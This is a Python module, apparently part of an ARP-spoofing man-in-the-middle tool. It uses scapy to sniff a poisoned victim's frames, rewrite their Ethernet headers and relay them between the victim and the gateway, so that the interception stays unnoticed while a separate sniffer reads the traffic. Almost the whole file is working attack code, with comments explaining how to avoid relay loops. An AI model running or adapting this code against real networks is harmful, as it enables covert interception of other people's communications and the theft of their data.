#!/usr/bin/env python3
"""
Forwarder: once the ARP caches are poisoned, traffic between the victim
and the gateway is addressed to us at Layer 2. If we don't relay it on to
its real destination the victim just loses connectivity, which is a
denial-of-service rather than a man-in-the-middle. This module rewrites
the Ethernet header on each intercepted frame and re-sends it, so traffic
keeps flowing while quietly passing through us.
"""
from scapy.all import sniff, sendp, Ether, IP
from config import TARGET_CONFIG


def packet_callback(packet):
    """
    Handle a single sniffed frame: rewrite its Ethernet header and
    re-send it toward the correct real destination.

    Called once per matching packet by run_forwarder()'s sniff() loop.
    Only the Layer 2 (Ethernet) addressing is changed -- the IP packet
    and its payload pass through untouched, which is what lets the
    sniffer downstream still read genuine victim traffic.
    """
    gateway_mac = TARGET_CONFIG["gateway_mac"]
    victim_ip = TARGET_CONFIG["victim_ip"]
    victim_mac = TARGET_CONFIG["victim_mac"]
    attacker_mac = TARGET_CONFIG["attacker_mac"]
    interface = TARGET_CONFIG["interface"]

    try:
        if not packet.haslayer(IP) or not packet.haslayer(Ether):
            return

        # A raw socket on Linux sees its own outgoing frames as well as
        # incoming ones. Without this check, every packet we relay would
        # get captured by this same sniff() call and re-sent again and
        # again, flooding the network. Anything already carrying our own
        # MAC as the source has already been handled.
        if packet[Ether].src.lower() == attacker_mac.lower():
            return

        ip_layer = packet[IP]

        if ip_layer.src == victim_ip:
            # Everything from the victim goes back out toward the
            # gateway's MAC, whatever the final IP destination is
            # (including the gateway's own IP, e.g. DNS lookups).
            packet[Ether].src = attacker_mac
            packet[Ether].dst = gateway_mac
            sendp(packet, iface=interface, verbose=False)
            print(f"[Forwarder] Relayed: Victim -> {ip_layer.dst}")

        elif ip_layer.dst == victim_ip:
            # Anything routed back for the victim (replies, or traffic
            # from the wider internet after NAT) goes out via the
            # victim's MAC.
            packet[Ether].src = attacker_mac
            packet[Ether].dst = victim_mac
            sendp(packet, iface=interface, verbose=False)
            print(f"[Forwarder] Relayed: {ip_layer.src} -> Victim")
    except Exception as e:
        print(f"[Forwarder] Error: {e}")


def run_forwarder():
    """
    Start the sniff loop that captures the victim's traffic and hands
    each packet to packet_callback() for relaying.

    Kept as a thin wrapper so the BPF filter (which packets scapy hands
    us at all) and the per-packet relay logic stay separately readable.
    """
    victim_ip = TARGET_CONFIG["victim_ip"]
    attacker_mac = TARGET_CONFIG["attacker_mac"]
    print(f"[*] Forwarder active: routing traffic for {victim_ip}...")
    # Filtering out our own MAC at capture time as well saves us from
    # even handing our own retransmissions to packet_callback.
    bpf_filter = f"ip and host {victim_ip} and not ether src {attacker_mac}"
    sniff(filter=bpf_filter, prn=packet_callback, store=0, iface=TARGET_CONFIG["interface"])
